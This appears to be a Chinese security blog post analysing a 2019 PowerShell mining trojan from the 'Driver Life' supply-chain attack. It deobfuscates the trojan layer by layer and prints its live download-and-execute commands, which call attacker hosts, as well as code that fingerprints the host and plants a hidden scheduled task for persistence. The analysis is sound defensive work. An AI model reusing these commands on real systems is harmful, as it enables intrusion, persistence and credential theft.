<!doctype html><html><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><title>驱动人生供应链木马攻击2019.1.30变种木马分析 - 倾旋的博客</title><meta name=viewport content="width=device-width,initial-scale=1">
<link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/normalize.css><link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/main.css><link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/extra.css><link id=dark-scheme rel=stylesheet type=text/css href=https://payloads.online/css/dark.css><script src=https://payloads.online/js/feather.min.js></script><script src=https://payloads.online/js/main.js></script></head><body><div class="container-wide wrapper"><div class=header><div class=avatar><a href=https://payloads.online/><img src=/avatar.jpeg alt=倾旋的博客></a></div><h1 class=site-title><a href=https://payloads.online/>倾旋的博客</a></h1><div class=site-description><p>现阶段在进行有效性验证/攻击模拟相关的安全研究工作，我的博客会记录一些我的学习过程和部分安全技术研究成果。</p><nav class="nav social"><ul class=flat><li><a href=https://github.com/rvn0xsy/ title=Github><i data-feather=github></i></a></li><li><a href=/index.xml title=RSS><i data-feather=rss></i></a></li><li><a href=/ title=Wechat><i data-feather=message-circle></i></a></li><span class=scheme-toggle><a href=# id=scheme-toggle></a></ul></nav></div><nav class=nav><ul class=flat><li><a href=/>首页</a></li><li><a href=/posts/>文章列表</a></li><li><a href=/tags>标签</a></li><li><a href=/projects>开源项目</a></li><li><a href=/about>关于我</a></li><li><a href=/links/>友情链接</a></li><li><a href=/message>留言</a></li><li><a href=/sponsor>赞助</a></li></ul></nav></div><div class=article-nav id=article-nav-id><div class=post><div class=post-header><div class=meta><div class=date><span class=day>23</span>
<span class=rest>Feb 2019</span></div></div><div class=matter><h1 class=title>驱动人生供应链木马攻击2019.1.30变种木马分析</h1></div></div><aside class="show-on-mobile toc" id=static-toc><header><h3>Contents</h3></header><nav id=TableOfContents><ol><li><a href=#0x00-事件背景>0x00 事件背景</a></li><li><a href=#0x01-分析研讨>0x01 分析研讨</a></li><li><a href=#0x02-分析过程>0x02 分析过程</a><ol><li><a href=#解密第一层>解密第一层</a></li><li><a href=#解密第二层>解密第二层</a></li><li><a href=#解密第三层>解密第三层</a></li><li><a href=#解密第四层>解密第四层</a></li></ol></li><li><a href=#0x03-行为分析>0x03 行为分析</a></li><li><a href=#0x04-预警与排查方案>0x04 预警与排查方案</a></li></ol></nav></aside><h2 id=0x00-事件背景>0x00 事件背景</h2><p>360安全大脑监测到通过"驱动人生"供应链攻击传播的挖矿木马在1月30日下午4时左右再次更新。此次更新中，木马在此前抓取系统帐户密码的基础上增加了抓取密码hash值的功能，并试图通过pass the hash攻击进行横向渗透，使得该木马的传播能力进一步加强，即使是有高强度口令的机器也有可能被攻陷。</p><p>pass the hash也称作哈希传递攻击，攻击者可以直接通过密码的哈希值访问远程主机或服务，而不用提供明文密码。攻击者使用pass the hash技术尝试在系统登录密码非弱口令并且无法抓取登录密码的情况下进行横向攻击，增加攻击成功率。</p><h2 id=0x01-分析研讨>0x01 分析研讨</h2><p>由于木马是样本都是不落地的方式，核心技术是通过定时计划任务执行powershell代码达到持续控制的目的，因此最先分析powershell代码，了解它做了哪些动作，指定查杀手段。</p><p>PS:样本代码过长，遂使用图片截图</p><h2 id=0x02-分析过程>0x02 分析过程</h2><h3 id=解密第一层>解密第一层</h3><p>病毒样本：</p><p><img src=https://images.payloads.online/4d16b518-4f5f-11ec-b05e-00d861bf4abb.png alt></p><p>第一个动作，创建一个名为<code>Certificate</code>的任务计划，在七点开始，每隔一小时执行一次以下命令：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>
</span></span><span style=display:flex><span>cmd.exe /c (cd %temp%&amp;certutil -urlcache -split -f http://cert.beahh.com/cert.php?ver1=%COMPUTERNAME% v.dat&gt;nul&amp;expand -r v.dat&gt;nul&amp;v.bat&gt;nul&amp;del v.dat v.bat&gt;nul)
</span></span></code></pre></td></tr></table></div></div><p>由于目前<code>cert.beahh.com</code>已经无法访问，所以进行下一个powershell分析环节。</p><p>首先，<code>powershell -nop -w hidden -ep bypass -e </code>后接着就是base64编码的powershell代码，并且以Bypass作为当前执行策略。</p><p>Windows中的powershell执行策略：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">9
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>PS C:\Users\Rvn0xsy&gt; Get-ExecutionPolicy -List
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        Scope ExecutionPolicy
</span></span><span style=display:flex><span>        ----- ---------------
</span></span><span style=display:flex><span>MachinePolicy       Undefined
</span></span><span style=display:flex><span>   UserPolicy       Undefined
</span></span><span style=display:flex><span>      Process       Undefined
</span></span><span style=display:flex><span>  CurrentUser       Undefined
</span></span><span style=display:flex><span> LocalMachine          Bypass
</span></span></code></pre></td></tr></table></div></div><p>将后面的base64解密后：</p><p><img src=https://images.payloads.online/4d5d8218-4f5f-11ec-baeb-00d861bf4abb.png alt></p><p>得到如下代码：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>while($true)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>[System.Threading.Thread]::Sleep(200000);
</span></span><span style=display:flex><span>[string]$m = (getmac /FO CSV|Select-Object -Skip 1 -first 1| ConvertFrom-Csv -Header MAC|select-object -expand MAC)
</span></span><span style=display:flex><span>$q = [System.Net.WebRequest]::Create(&#34;http://new.beahh.com/startup.php?ver=1&amp;mac=&#34;+$m+&#34;&amp;ver=&#34;+(Get-WmiObject -Class Win32_OperatingSystem).version+&#34;&amp;bit=&#34;+(Get-WmiObject Win32_OperatingSystem).OSArchitecture).GetResponse().GetResponseStream();
</span></span><span style=display:flex><span>$r = (new-object System.IO.StreamReader $q).ReadToEnd() -replace &#34;##&#34;;
</span></span><span style=display:flex><span>$c = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($r));
</span></span><span style=display:flex><span>iex $c;
</span></span><span style=display:flex><span>[System.Threading.Thread]::Sleep(1000000);
</span></span><span style=display:flex><span>}
</span></span></code></pre></td></tr></table></div></div><p>外部是一个循环，将Sleep去除后，可以看到调用了<code>Invoke-Expression</code>，<code>Invoke-Expression</code>是一个能将变量的内容当作powershell表达式执行的函数。</p><p>而iex只是<code>Invoke-Expression</code>的别名。</p><p>下面简单演示几个例子：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>PS C:\Users\Rvn0xsy&gt; iex &#34;Write-Host Rvn0xsy&#34;
</span></span><span style=display:flex><span>Rvn0xsy
</span></span><span style=display:flex><span>PS C:\Users\Rvn0xsy&gt; Write-Host Rvn0xsy
</span></span><span style=display:flex><span>Rvn0xsy
</span></span><span style=display:flex><span>PS C:\Users\Rvn0xsy&gt; Invoke-Expression &#34;Write-Host Rvn0xsy&#34;
</span></span><span style=display:flex><span>Rvn0xsy
</span></span><span style=display:flex><span>PS C:\Users\Rvn0xsy&gt;
</span></span></code></pre></td></tr></table></div></div><p>将上述的木马脚本中iex替换成Write-Host即可：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">9
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>while($true)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>[string]$m = (getmac /FO CSV|Select-Object -Skip 1 -first 1| ConvertFrom-Csv -Header MAC|select-object -expand MAC)
</span></span><span style=display:flex><span>$q = [System.Net.WebRequest]::Create(&#34;http://new.beahh.com/startup.php?ver=1&amp;mac=&#34;+$m+&#34;&amp;ver=&#34;+(Get-WmiObject -Class Win32_OperatingSystem).version+&#34;&amp;bit=&#34;+(Get-WmiObject Win32_OperatingSystem).OSArchitecture).GetResponse().GetResponseStream();
</span></span><span style=display:flex><span>$r = (new-object System.IO.StreamReader $q).ReadToEnd() -replace &#34;##&#34;;
</span></span><span style=display:flex><span>$c = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($r));
</span></span><span style=display:flex><span>Write-Host $c;
</span></span><span style=display:flex><span>}
</span></span></code></pre></td></tr></table></div></div><p>在这里我们使用Windows 10自带的Windows Powershell ISE脚本调试器来进行后续的分析。</p><p><img src=https://images.payloads.online/4da5b0ce-4f5f-11ec-8b80-00d861bf4abb.png alt></p><h3 id=解密第二层>解密第二层</h3><p>很明显，我们看到有<code>Invoke-Expression</code>，直接将<code>Invoke-Expression</code>改为<code>Write-Host</code>进行调试。</p><p><img src=https://images.payloads.online/4df4fdfa-4f5f-11ec-9352-00d861bf4abb.png alt></p><h3 id=解密第三层>解密第三层</h3><p>现在获得的代码可读性变得非常低了，但是还是有一定规律可循。</p><p>在第83行，有一个大小写混合的<code>Invoke-Expression</code>：</p><p><img src=https://images.payloads.online/4e3585f0-4f5f-11ec-aae2-00d861bf4abb.png alt></p><p>并且<code>Invoke-Expression</code>做左边还有一个管道符，直接将代码改为<code>| Out-File .\tmp.log</code> ，把结果输出到tmp.log文件中。</p><h3 id=解密第四层>解密第四层</h3><p><img src=https://images.payloads.online/4e75dcae-4f5f-11ec-b69a-00d861bf4abb.png alt></p><p>第四次好像混淆的更加厉害来，但是不影响我们的分析，先看首行：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span> . ( $EnV:CoMsPec[4,26,25]-JoIN&#39;&#39;)(((&#39;[string]3CHav = U&#39;+&#39;ABUAB[string]....
</span></span></code></pre></td></tr></table></div></div><p>其中它是以<code>. (表达式)(表达式)</code>来执行的，于是我想到了另外一种函数调用的可能：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>PS C:\Users\Rvn0xsy&gt; . Write-Host &#34;Rvn0xsy&#34;
</span></span><span style=display:flex><span>Rvn0xsy
</span></span><span style=display:flex><span>PS C:\Users\Rvn0xsy&gt;
</span></span></code></pre></td></tr></table></div></div><p>这样也能执行，所以我判断<code> . ( $EnV:CoMsPec[4,26,25]-JoIN'')</code>就是<code>iex</code>或者<code>Invoke-Expression</code>，我将<code> . ( $EnV:CoMsPec[4,26,25]-JoIN'')</code>改为<code>Write-Host</code>直接执行：</p><p><img src=https://images.payloads.online/4eb87816-4f5f-11ec-a2c3-00d861bf4abb.png alt></p><p>最终获得了未混淆的代码。</p><p>然后，为了验证我的猜想，我把代码进行更改，获得了<code>Iex</code>：</p><p><img src=https://images.payloads.online/4ef7f8c4-4f5f-11ec-8df4-00d861bf4abb.png alt></p><p><code>. ( $EnV:CoMsPec[4,26,25]-JoIN'')</code> = <code>Iex</code></p><h2 id=0x03-行为分析>0x03 行为分析</h2><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">9
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-gdscript3 data-lang=gdscript3><span style=display:flex><span>[string]<span style=color:#f92672>$</span>av <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>[string]<span style=color:#f92672>$</span>avs <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>[string]<span style=color:#f92672>$</span>mac <span style=color:#f92672>=</span> (getmac <span style=color:#f92672>/</span>FO CSV<span style=color:#f92672>|</span>Select<span style=color:#f92672>-</span><span style=color:#a6e22e>Object</span> <span style=color:#f92672>-</span>Skip <span style=color:#ae81ff>1</span> <span style=color:#f92672>-</span>first <span style=color:#ae81ff>1</span><span style=color:#f92672>|</span> ConvertFrom<span style=color:#f92672>-</span>Csv <span style=color:#f92672>-</span>Header MAC<span style=color:#f92672>|</span>select<span style=color:#f92672>-</span>object <span style=color:#f92672>-</span>expand MAC)<span style=color:#f92672>$</span>avs <span style=color:#f92672>=</span> (Get<span style=color:#f92672>-</span>WmiObject <span style=color:#f92672>-</span>Namesp
</span></span><span style=display:flex><span>ace root\SecurityCenter2 <span style=color:#f92672>-</span>Class AntiVirusProduct)<span style=color:#f92672>.</span>displayNameif(<span style=color:#f92672>$</span>avs<span style=color:#f92672>.</span>GetType()<span style=color:#f92672>.</span>name<span style=color:#f92672>.</span>IndexOf(<span style=color:#e6db74>&#39;Object&#39;</span>) <span style=color:#f92672>-</span>gt <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>){<span style=color:#66d9ef>for</span>(<span style=color:#f92672>$</span>v <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; <span style=color:#f92672>$</span>v <span style=color:#f92672>-</span>lt <span style=color:#f92672>$</span>avs<span style=color:#f92672>.</span>Count; <span style=color:#f92672>$</span>v<span style=color:#f92672>++</span>){<span style=color:#f92672>$</span>av <span style=color:#f92672>+=</span> <span style=color:#f92672>$</span>avs[<span style=color:#f92672>$</span>v] <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;|&#34;</span>}}<span style=color:#66d9ef>else</span>{<span style=color:#f92672>$</span>av 
</span></span><span style=display:flex><span><span style=color:#f92672>=</span> <span style=color:#f92672>$</span>avs}try{<span style=color:#66d9ef>if</span>((Get<span style=color:#f92672>-</span>Service zhudongfangyu <span style=color:#f92672>|</span> Sort <span style=color:#f92672>-</span>Property Status)<span style=color:#f92672>.</span>Status <span style=color:#f92672>-</span>eq <span style=color:#e6db74>&#34;Running&#34;</span>){<span style=color:#f92672>$</span>av <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#39;ZDFY&#39;</span>}}catch{}<span style=color:#75715e>#[System.Threading.Thread]::Sleep((Get-Random -Minimum 10000 -Maximum</span>
</span></span><span style=display:flex><span> <span style=color:#ae81ff>100000</span>))<span style=color:#f92672>$</span>path <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;$env:temp</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>ppp.log&#34;</span>[string]<span style=color:#f92672>$</span>flag <span style=color:#f92672>=</span> test<span style=color:#f92672>-</span>path <span style=color:#f92672>$</span>path<span style=color:#f92672>$</span>key <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&amp;mac=&#34;</span><span style=color:#f92672>+$</span>mac<span style=color:#f92672>+</span><span style=color:#e6db74>&#34;&amp;av=&#34;</span><span style=color:#f92672>+$</span>av<span style=color:#f92672>+</span><span style=color:#e6db74>&#34;&amp;ver=&#34;</span><span style=color:#f92672>+</span>(Get<span style=color:#f92672>-</span>WmiObject <span style=color:#f92672>-</span>Class Win32_OperatingSystem)<span style=color:#f92672>.</span>version<span style=color:#f92672>+</span><span style=color:#e6db74>&#34;&amp;bit=&#34;</span><span style=color:#f92672>+</span>(Get<span style=color:#f92672>-</span>WmiObj
</span></span><span style=display:flex><span>ect Win32_OperatingSystem)<span style=color:#f92672>.</span>OSArchitecture <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&amp;flag2=&#34;</span> <span style=color:#f92672>+</span> <span style=color:#f92672>$</span>flag <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&amp;domain=&#34;</span> <span style=color:#f92672>+</span> (Get<span style=color:#f92672>-</span>WmiObject win32_computersystem)<span style=color:#f92672>.</span>Domain <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&amp;user=&#34;</span> <span style=color:#f92672>+</span> <span style=color:#f92672>$</span>env:USERNAMEtry{<span style=color:#f92672>$</span>file <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;$env:appdata</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Micro</span>
</span></span><span style=display:flex><span>soft\\cred<span style=color:#f92672>.</span>ps1<span style=color:#e6db74>&#34;$size = (Get-ChildItem $file -recurse | Measure-Object -property length -sum).sum$file2 = &#34;</span><span style=color:#f92672>$</span>env:ALLUSERSPROFILE\\Microsoft\\cred<span style=color:#f92672>.</span>ps1<span style=color:#e6db74>&#34;$size2 = (Get-ChildItem $file2 </span>
</span></span><span style=display:flex><span><span style=color:#f92672>-</span>recurse <span style=color:#f92672>|</span> Measure<span style=color:#f92672>-</span><span style=color:#a6e22e>Object</span> <span style=color:#f92672>-</span>property length <span style=color:#f92672>-</span>sum)<span style=color:#f92672>.</span>sum        <span style=color:#66d9ef>if</span>((<span style=color:#f92672>$</span>size <span style=color:#f92672>-</span>ne <span style=color:#ae81ff>50731</span>) <span style=color:#f92672>-</span><span style=color:#f92672>and</span> (<span style=color:#f92672>$</span>size2 <span style=color:#f92672>-</span>ne <span style=color:#ae81ff>50731</span>)){try{<span style=color:#f92672>$</span>url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;http://172.104.177.202/new.dat?xl&#39;</span> <span style=color:#f92672>+</span> <span style=color:#f92672>$</span>key(New<span style=color:#f92672>-</span><span style=color:#a6e22e>Object</span> System<span style=color:#f92672>.</span>N
</span></span><span style=display:flex><span>et<span style=color:#f92672>.</span>WebClient)<span style=color:#f92672>.</span>DownloadFile(<span style=color:#f92672>$</span>url,<span style=color:#e6db74>&#34;$file&#34;</span>)}catch{}<span style=color:#f92672>&amp;</span>cmd<span style=color:#f92672>.</span>exe <span style=color:#f92672>/</span>c schtasks <span style=color:#f92672>/</span>create <span style=color:#f92672>/</span>sc MINUTE <span style=color:#f92672>/</span>mo <span style=color:#ae81ff>60</span> <span style=color:#f92672>/</span>st <span style=color:#ae81ff>07</span>:<span style=color:#ae81ff>00</span>:<span style=color:#ae81ff>00</span> <span style=color:#f92672>/</span>tn Credentials <span style=color:#f92672>/</span>tr <span style=color:#e6db74>&#34;powershell -nop -w hidden -ep bypass -f %appdata%</span><span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span><span style=color:#e6db74>Microsoft\cred.ps1&#34;</span> <span style=color:#f92672>/</span>F}}catch{}[System<span style=color:#f92672>.</span>Threading<span style=color:#f92672>.</span>Thread]::Sleep(<span style=color:#ae81ff>3000</span>)Stop<span style=color:#f92672>-</span>Process <span style=color:#f92672>-</span>Force <span style=color:#f92672>-</span>processname powershell
</span></span></code></pre></td></tr></table></div></div><p>大致意思就是收集本机的操作系统版本、用户名、MAC地址、杀毒软件写入当前环境变量的<code>temp\ppp.log</code>中。</p><p>一般是<code>C:\Users\&lt;USERNAME>\AppData\Local\Temp\ppp.log</code></p><p>然后下载新的powershell文件，到<code>C:\Users\&lt;USERNAME>\AppData\Roaming\Microsoft\cred.ps1</code>中。</p><p>下载的URL是：http://172.104.177.202/new.dat?xl</p><p><img src=https://images.payloads.online/4f43cf74-4f5f-11ec-b265-00d861bf4abb.png alt></p><p>目前ti上未打标签。</p><p>再次经过N层解密后，得到如下代码：</p><p><img src=https://images.payloads.online/4f83bf76-4f5f-11ec-93f1-00d861bf4abb.png alt></p><p>大约6000多行</p><p><img src=https://images.payloads.online/4fcaba3e-4f5f-11ec-934a-00d861bf4abb.png alt></p><p>脚本的功能：</p><p>1.获得当前用户Hash，读取注册表</p><p>2.获得当前系统版本、MAC地址、当前系统所有用户、反病毒软件，尤其是360 Zhudongfangyu服务</p><p>3.端口扫描，全量1-65535、445、139都会扫描</p><p>4.依赖于445 SMB服务进行传播</p><p>其中，常用的Hash和用户名：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
